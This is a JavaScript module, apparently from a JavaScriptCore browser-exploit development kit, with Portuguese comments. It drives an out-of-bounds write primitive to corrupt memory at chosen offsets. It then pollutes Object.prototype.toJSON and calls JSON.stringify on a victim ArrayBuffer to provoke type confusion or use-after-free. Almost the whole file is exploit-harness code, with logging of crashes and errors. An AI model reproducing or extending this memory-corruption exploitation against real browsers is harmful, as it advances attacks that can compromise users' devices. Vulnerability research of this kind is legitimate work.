// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Contador global para ser usado pelas variantes de toJSON definidas em runAllAdvancedTestsS3.mjs
export let current_toJSON_call_count_for_TypeError_test = 0;

export async function executeFocusedTestForTypeError(
    testDescription,
    toJSONFunctionToUse, // A variante da função toJSON a ser testada
    valueToWriteOOB,     // O valor a ser escrito via OOB
    corruptionOffsetToTest // O offset específico para esta escrita OOB
) {
    const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
    logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
    document.title = `Iniciando: ${testDescription}`;

    current_toJSON_call_count_for_TypeError_test = 0; // Resetar para cada teste

    const victim_ab_size_val = 64;
    const bytes_to_write_val = 4;
    const ppKey_val = 'toJSON';

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME);
        document.title = "ERRO OOB Setup - " + FNAME;
        return { errorOccurred: new Error("OOB Setup Failed"), calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed: false };
    }
    document.title = "OOB OK - " + FNAME;

    let victim_ab = new ArrayBuffer(victim_ab_size_val);
    logS3(`ArrayBuffer vítima (${victim_ab_size_val} bytes) recriado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true; 
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${ppKey_val} com ${testDescription}...`, "info", FNAME);
        document.title = `Aplicando PP (${testDescription})`;
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com ${testDescription}.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP OK (${testDescription})`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
        document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`;
        oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify (${toHex(corruptionOffsetToTest)})`;
        logS3(`Chamando JSON.stringify(victim_ab) (com ${testDescription})...`, "info", FNAME);
        
        try {
            stringifyResult = JSON.stringify(victim_ab); 
            stepReached = `apos_stringify`;
            potentiallyCrashed = false; 
            document.title = `Strfy OK (${testDescription})`;
            logS3(`Resultado JSON.stringify: ${String(stringifyResult).substring(0, 100)}... (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify`;
            potentiallyCrashed = false; 
            errorCaptured = e;
            document.title = `ERRO Strfy (${e.name}) - ${testDescription}`;
            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}. (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "critical", FNAME);
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error"); 
            console.error(`JSON.stringify ERROR (${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal - " + FNAME;
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}.`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}`, "error", FNAME);
        }
    }
    logS3(`--- Teste Focado para TypeError Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste Concluído OK - ${testDescription}`;
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
        document.title = `ERRO OCORREU (${errorCaptured.name}) - ${testDescription}`;
    }
    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed };
}
